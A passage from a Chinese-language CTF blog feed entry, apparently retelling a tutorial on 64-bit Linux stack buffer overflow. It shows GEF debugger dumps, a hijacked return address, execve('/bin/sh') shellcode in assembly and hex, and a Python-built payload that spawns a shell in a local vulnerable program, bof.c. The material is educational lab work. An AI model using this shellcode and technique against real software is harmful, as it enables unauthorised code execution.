class="language-bash">rax   : 0x0</span>               </span><br><span class="line"><span class="meta">$</span><span class="language-bash">rbx   : 0x0000555555555230  →  &lt;__libc_csu_init+0&gt; endbr64</span> </span><br><span class="line"><span class="meta">$</span><span class="language-bash">rcx   : 0x00007ffff7ec4077  →  0x5177fffff0003d48 (<span class="string">&quot;H=&quot;</span>?)</span></span><br><span class="line"><span class="meta">$</span><span class="language-bash">rdx   : 0x0</span>               </span><br><span class="line"><span class="meta">$</span><span class="language-bash">rsp   : 0x00007fffffffde70  →  0x00007ffff7ffc620  →  0x00050a3600000000</span></span><br><span class="line"><span class="meta">$</span><span class="language-bash">rbp   : 0x4141414141414141 (<span class="string">&quot;AAAAAAAA&quot;</span>?)</span></span><br><span class="line"><span class="meta">$</span><span class="language-bash">rsi   : 0x00005555555592a0  →  <span class="string">&quot;AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA[...]&quot;</span></span></span><br><span class="line"><span class="meta">$</span><span class="language-bash">rdi   : 0x00007ffff7fa47e0  →  0x0000000000000000</span></span><br><span class="line"><span class="meta">$</span><span class="language-bash">rip   : 0x424242424242</span>    </span><br><span class="line"><span class="meta">$</span><span class="language-bash">r8    : 0x10f</span>             </span><br><span class="line"><span class="meta">$</span><span class="language-bash">r9    : 0xf</span>               </span><br><span class="line"><span class="meta">$</span><span class="language-bash">r10   : 0x0000555555556006  →  0x00443b031b01000a (<span class="string">&quot;\n&quot;</span>?)</span></span><br><span class="line"><span class="meta">$</span><span class="language-bash">r11   : 0x246</span>             </span><br><span class="line"><span class="meta">$</span><span class="language-bash">r12   : 0x00005555555550c0  →  &lt;_start+0&gt; endbr64</span> </span><br><span class="line"><span class="meta">$</span><span class="language-bash">r13   : 0x00007fffffffdf50  →  0x0000000000000002</span></span><br><span class="line"><span class="meta">$</span><span class="language-bash">r14   : 0x0</span>               </span><br><span class="line"><span class="meta">$</span><span class="language-bash">r15   : 0x0</span>               </span><br><span class="line"><span class="meta">$</span><span class="language-bash">eflags: [ZERO carry PARITY adjust sign <span class="built_in">trap</span> INTERRUPT direction overflow RESUME virtualx86 identification]</span></span><br><span class="line"><span class="meta">$</span><span class="language-bash">cs: 0x33 <span class="variable">$ss</span>: 0x2b <span class="variable">$ds</span>: 0x00 <span class="variable">$es</span>: 0x00 <span class="variable">$fs</span>: 0x00 <span class="variable">$gs</span>: 0x00</span> </span><br><span class="line">───────────────────────────────────────────────────────────────────── stack ────</span><br><span class="line">0x00007fffffffde70│+0x0000: 0x00007ffff7ffc620  →  0x00050a3600000000 ← $rsp</span><br><span class="line">0x00007fffffffde78│+0x0008: 0x00007fffffffdf58  →  0x00007fffffffe2a7  →  0x61732f656d6f682f</span><br><span class="line">0x00007fffffffde80│+0x0010: 0x0000000200000000</span><br><span class="line">0x00007fffffffde88│+0x0018: 0x00005555555551a9  →  &lt;main+0&gt; endbr64 </span><br><span class="line">0x00007fffffffde90│+0x0020: 0x0000555555555230  →  &lt;__libc_csu_init+0&gt; endbr64 </span><br><span class="line">0x00007fffffffde98│+0x0028: 0xbdf64f9ef20c1d5a</span><br><span class="line">0x00007fffffffdea0│+0x0030: 0x00005555555550c0  →  &lt;_start+0&gt; endbr64 </span><br><span class="line">0x00007fffffffdea8│+0x0038: 0x00007fffffffdf50  →  0x0000000000000002</span><br><span class="line">─────────────────────────────────────────────────────────────── code:x86:64 ────</span><br><span class="line">[!] Cannot disassemble from $PC</span><br><span class="line">[!] Cannot access memory at address 0x424242424242</span><br><span class="line">─────────────────────────────────────────────────────────────────── threads ────</span><br><span class="line"><span class="meta">[#</span><span class="language-bash">0] Id 1, Name: <span class="string">&quot;bof&quot;</span>, stopped 0x424242424242 <span class="keyword">in</span> ?? (), reason: SIGSEGV</span></span><br><span class="line">───────────────────────────────────────────────────────────────────── trace ────</span><br><span class="line">────────────────────────────────────────────────────────────────────────────────</span><br><span class="line">gef➤  </span><br></pre></td></tr></table></figure><p>可以看到 <code>$rip : 0x424242424242</code> ，程序流程已经被我们控制了。</p><h2 id="5-跳入用户控制的缓冲区"><a class="markdownIt-Anchor" href="#5-跳入用户控制的缓冲区"></a> 5. 跳入用户控制的缓冲区</h2><p>事实上这部分内容没什么特别的或者新的东西你只需要指向你<strong>控制的缓冲区开头</strong>，也就是第一个 <code>printf</code> 显示出来的值，在这里是 <code>0x00007fffffffdd40</code>。通过 <code>gdb</code> 也可以很容易地重新获得这个值你只需在调用 <code>strcpy</code> 之后显示栈。（在上面是我们运行到断点 puts 处）</p><p>是时候更新我们的载荷了，新的载荷看起来像这样：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&quot;A&quot; * 264 + &quot;\x7f\xff\xff\xff\xdd\x40&quot;[::-1] </span><br></pre></td></tr></table></figure><p>因为是小端结构所以我们需要把内存地址反序。这就是python语句[::-1]所实现的。</p><p>确认下我们跳入正确的地址，gdb 调试程序到指令 ret 处：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br></pre></td><td class="code"><pre><span class="line">gef➤  b puts</span><br><span class="line">Breakpoint 1 at 0x1090</span><br><span class="line">gef➤  r $(python -c &#x27;print &quot;A&quot; * 264 + &quot;\x7f\xff\xff\xff\xdd\x40&quot;[::-1]&#x27;) </span><br><span class="line"></span><br><span class="line">......</span><br><span class="line"></span><br><span class="line">[ Legend: Modified register | Code | Heap | Stack | String ]</span><br><span class="line">───────────────────────────────────────────────────────────────── registers ────</span><br><span class="line"><span class="meta">$</span><span class="language-bash">rax   : 0x0</span>               </span><br><span class="line"><span class="meta">$</span><span class="language-bash">rbx   : 0x0000555555555230  →  &lt;__libc_csu_init+0&gt; endbr64</span> </span><br><span class="line"><span class="meta">$</span><span class="language-bash">rcx   : 0x00007ffff7ec4077  →  0x5177fffff0003d48 (<span class="string">&quot;H=&quot;</span>?)</span></span><br><span class="line"><span class="meta">$</span><span class="language-bash">rdx   : 0x0</span>               </span><br><span class="line"><span class="meta">$</span><span class="language-bash">rsp   : 0x00007fffffffde68  →  0x00007fffffffdd40  →  0x0000000000000000</span></span><br><span class="line"><span class="meta">$</span><span class="language-bash">rbp   : 0x4141414141414141 (<span class="string">&quot;AAAAAAAA&quot;</span>?)</span></span><br><span class="line"><span class="meta">$</span><span class="language-bash">rsi   : 0x00005555555592a0  →  <span class="string">&quot;AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA[...]&quot;</span></span></span><br><span class="line"><span class="meta">$</span><span class="language-bash">rdi   : 0x00007ffff7fa47e0  →  0x0000000000000000</span></span><br><span class="line"><span class="meta">$</span><span class="language-bash">rip   : 0x0000555555555228  →  &lt;main+127&gt; ret</span> </span><br><span class="line"><span class="meta">$</span><span class="language-bash">r8    : 0x10f</span>             </span><br><span class="line"><span class="meta">$</span><span class="language-bash">r9    : 0xf</span>               </span><br><span class="line"><span class="meta">$</span><span class="language-bash">r10   : 0x0000555555556006  →  0x00443b031b01000a (<span class="string">&quot;\n&quot;</span>?)</span></span><br><span class="line"><span class="meta">$</span><span class="language-bash">r11   : 0x246</span>             </span><br><span class="line"><span class="meta">$</span><span class="language-bash">r12   : 0x00005555555550c0  →  &lt;_start+0&gt; endbr64</span> </span><br><span class="line"><span class="meta">$</span><span class="language-bash">r13   : 0x00007fffffffdf50  →  0x0000000000000002</span></span><br><span class="line"><span class="meta">$</span><span class="language-bash">r14   : 0x0</span>               </span><br><span class="line"><span class="meta">$</span><span class="language-bash">r15   : 0x0</span>               </span><br><span class="line"><span class="meta">$</span><span class="language-bash">eflags: [ZERO carry PARITY adjust sign <span class="built_in">trap</span> INTERRUPT direction overflow resume virtualx86 identification]</span></span><br><span class="line"><span class="meta">$</span><span class="language-bash">cs: 0x33 <span class="variable">$ss</span>: 0x2b <span class="variable">$ds</span>: 0x00 <span class="variable">$es</span>: 0x00 <span class="variable">$fs</span>: 0x00 <span class="variable">$gs</span>: 0x00</span> </span><br><span class="line">───────────────────────────────────────────────────────────────────── stack ────</span><br><span class="line">0x00007fffffffde68│+0x0000: 0x00007fffffffdd40  →  0x0000000000000000 ← $rsp</span><br><span class="line">0x00007fffffffde70│+0x0008: 0x00007ffff7ffc620  →  0x00050a3600000000</span><br><span class="line">0x00007fffffffde78│+0x0010: 0x00007fffffffdf58  →  0x00007fffffffe2a7  →  0x61732f656d6f682f</span><br><span class="line">0x00007fffffffde80│+0x0018: 0x0000000200000000</span><br><span class="line">0x00007fffffffde88│+0x0020: 0x00005555555551a9  →  &lt;main+0&gt; endbr64 </span><br><span class="line">0x00007fffffffde90│+0x0028: 0x0000555555555230  →  &lt;__libc_csu_init+0&gt; endbr64 </span><br><span class="line">0x00007fffffffde98│+0x0030: 0x81a925b6868c83d3</span><br><span class="line">0x00007fffffffdea0│+0x0038: 0x00005555555550c0  →  &lt;_start+0&gt; endbr64 </span><br><span class="line">─────────────────────────────────────────────────────────────── code:x86:64 ────</span><br><span class="line">   0x55555555521d &lt;main+116&gt;       call   0x555555555090 &lt;puts@plt&gt;</span><br><span class="line">   0x555555555222 &lt;main+121&gt;       mov    eax, 0x0</span><br><span class="line">   0x555555555227 &lt;main+126&gt;       leave  </span><br><span class="line"> → 0x555555555228 &lt;main+127&gt;       ret    </span><br><span class="line">   ↳  0x7fffffffdd40                  add    BYTE PTR [rax], al</span><br><span class="line">      0x7fffffffdd42                  add    BYTE PTR [rax], al</span><br><span class="line">      0x7fffffffdd44                  add    BYTE PTR [rax], al</span><br><span class="line">      0x7fffffffdd46                  add    BYTE PTR [rax], al</span><br><span class="line">      0x7fffffffdd48                  and    dl, BYTE PTR [rdx+0x55]</span><br><span class="line">      0x7fffffffdd4b                  push   rbp</span><br><span class="line">─────────────────────────────────────────────────────────── source:bof.c+14 ────</span><br><span class="line">      9       &#125;</span><br><span class="line">     10       printf(&quot;%p\n&quot;, buffer);</span><br><span class="line">     11       strcpy(buffer,  argv[1]);</span><br><span class="line">     12       printf(&quot;%s\n&quot;, buffer);</span><br><span class="line">     13       return 0;</span><br><span class="line"> →   14 &#125;</span><br><span class="line">─────────────────────────────────────────────────────────────────── threads ────</span><br><span class="line"><span class="meta">[#</span><span class="language-bash">0] Id 1, Name: <span class="string">&quot;bof&quot;</span>, stopped 0x555555555228 <span class="keyword">in</span> main (), reason: SINGLE STEP</span></span><br><span class="line">───────────────────────────────────────────────────────────────────── trace ────</span><br><span class="line"><span class="meta">[#</span><span class="language-bash">0] 0x555555555228 → main(argc=0x2, argv=0x7fffffffdf58)</span></span><br><span class="line">────────────────────────────────────────────────────────────────────────────────</span><br><span class="line">gef➤  </span><br><span class="line"></span><br></pre></td></tr></table></figure><p>我们可以看到，此时的栈顶 (<code>rsp</code>) 为 <code>0x00007fffffffdd40</code>，<code>ret</code> 执行后 <code>rip</code> 就将跳转到 <code>0x00007fffffffdd40</code> 处执行。</p><h2 id="6-执行shellcode"><a class="markdownIt-Anchor" href="#6-执行shellcode"></a> 6. 执行shellcode</h2><p>在这个例子中我准备用个定制的shellcode去打开 shell 。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">global _start</span><br><span class="line">section .text</span><br><span class="line"> </span><br><span class="line">_start:</span><br><span class="line">; execve(&quot;/bin/sh&quot;, [&quot;/bin/sh&quot;], NULL)</span><br><span class="line">; rax = 0x3b, rdx= NULL, rdi = &#x27;//bin/sh&#x27;, rsi = &#x27;//bin/sh&#x27;</span><br><span class="line">xorrdx, rdx</span><br><span class="line">movqword rbx, &#x27;//bin/sh&#x27;; 0x68732f6e69622f2f</span><br><span class="line">shrrbx, 0x8</span><br><span class="line">pushrbx</span><br><span class="line">movrdi, rsp</span><br><span class="line">pushrax</span><br><span class="line">pushrdi</span><br><span class="line">movrsi, rsp</span><br><span class="line">moval, 0x3b</span><br><span class="line">syscall</span><br></pre></td></tr></table></figure><p>接下来汇编这个文件然后提取shellcode。</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">sakura@Kylin:~/文档/overflow$ touch shell.asm</span><br><span class="line">sakura@Kylin:~/文档/overflow$ nasm -f elf64 shell.asm </span><br><span class="line">sakura@Kylin:~/文档/overflow$ ld -m elf_x86_64 shell.o -o shell </span><br><span class="line">sakura@Kylin:~/文档/overflow$ ./shell</span><br><span class="line"><span class="meta">$ </span><span class="language-bash"><span class="built_in">exit</span></span></span><br><span class="line">sakura@Kylin:~/文档/overflow$ for i in $(objdump  -d shell.o | grep &quot;^ &quot; | cut  -f2); do echo  -n  &#x27;\x&#x27;$i; done; echo </span><br><span class="line">\x48\x31\xd2\x48\xbb\x2f\x2f\x62\x69\x6e\x2f\x73\x68\x48\xc1\xeb\x08\x53\x48\x89\xe7\x50\x57\x48\x89\xe6\xb0\x3b\x0f\x05</span><br><span class="line">sakura@Kylin:~/文档/overflow$ </span><br></pre></td></tr></table></figure><p>这个 shellcode 长 30 字节，来构造最终的载荷吧。</p><p>原来的载荷</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$(python -c <span class="string">&#x27;print &quot;A&quot; * 264 + &quot;\x7f\xff\xff\xff\xdd\x40&quot;[::-1]&#x27;</span>) </span><br></pre></td></tr></table></figure><p>我们要保证一样的大小所以264 - 30 = 234</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$(python -c <span class="string">&#x27;print &quot;A&quot; * 234 + &quot;\x7f\xff\xff\xff\xdd\x40&quot;[::-1]&#x27;</span>) </span><br></pre></td></tr></table></figure><p>然后把 shellcode 接在开头：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$(python -c <span class="string">&#x27;print  &quot;\x48\x31\xd2\x48\xbb\x2f\x2f\x62\x69\x6e\x2f\x73\x68\x48\xc1\xeb\x08\x53\x48\x89\xe7\x50\x57\x48\x89\xe6\xb0\x3b\x0f\x05&quot; + &quot;A&quot; * 234 +  &quot;\x7f\xff\xff\xff\xdd\x40&quot;[::-1]&#x27;</span>) </span><br></pre></td></tr></table></figure><p>来把所有东西一块儿测试：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">$ </span><span class="language-bash">gdb-gef bof</span> </span><br><span class="line">gef➤  run $(python -c &#x27;print  &quot;\x48\x31\xd2\x48\xbb\x2f\x2f\x62\x69\x6e\x2f\x73\x68\x48\xc1\xeb\x08\x53\x48\x89\xe7\x50\x57\x48\x89\xe6\xb0\x3b\x0f\x05&quot; + &quot;A&quot; * 234 +  &quot;\x7f\xff\xff\xff\xdd\x40&quot;[::-1]&#x27;) </span><br><span class="line">Starting program: /home/sakura/文档/overflow/bof $(python -c &#x27;print  &quot;\x48\x31\xd2\x48\xbb\x2f\x2f\x62\x69\x6e\x2f\x73\x68\x48\xc1\xeb\x08\x53\x48\x89\xe7\x50\x57\x48\x89\xe6\xb0\x3b\x0f\x05&quot; + &quot;A&quot; * 234 +  &quot;\x7f\xff\xff\xff\xdd\x40&quot;[::-1]&#x27;)</span><br><span class="line">[*] Failed to find objfile or not a valid file format: [Errno 2] 没有那个文件或目录: &#x27;system-supplied DSO at 0x7ffff7fcd000&#x27;</span><br><span class="line">0x7fffffffdd40</span><br><span class="line">H1�H�//bin/shH�SH��PWH��;AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA`����</span><br><span class="line">process 4893 is executing new program: /usr/bin/dash</span><br><span class="line"><span class="meta">$ </span></span><br></pre></td></tr></table></figure><p>出现了 $ 就显示我们执行成功了。要注意内存地址是可以变化的这样可能就和我这里的不同了。</p><blockquote><p>参考：</p><p><a href="http://packetstormsecurity.com/files/download/127007/64bit-overflow.pdf">64 Bits Linux Stack Based Buffer Overflow  </a> — 英文原文</p><p><a href="https://juejin.cn/post/6844903571742261262#heading-0">64位Linux下的栈溢出</a> — 中文翻译</p></blockquote>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;[TOC]&lt;/p&gt;
&lt;h2 id=&quot;1-x86和x86_64的区别&quot;&gt;&lt;a class=&quot;markdownIt-Anchor&quot; href=&quot;#1-x86和x86_64的区别&quot;&gt;&lt;/a&gt; 1. x86和x86_64的区别&lt;/h2&gt;
&lt;p&gt;第一个主要区别就是内存地址的大小。这没</summary>
      
    
    
    
    <category term="CTF" scheme="https://www.rgzzplus.com/categories/CTF/"/>
    
    
    <category term="栈溢出" scheme="https://www.rgzzplus.com/tags/%E6%A0%88%E6%BA%A2%E5%87%BA/"/>
    
  </entry>
  
</feed>
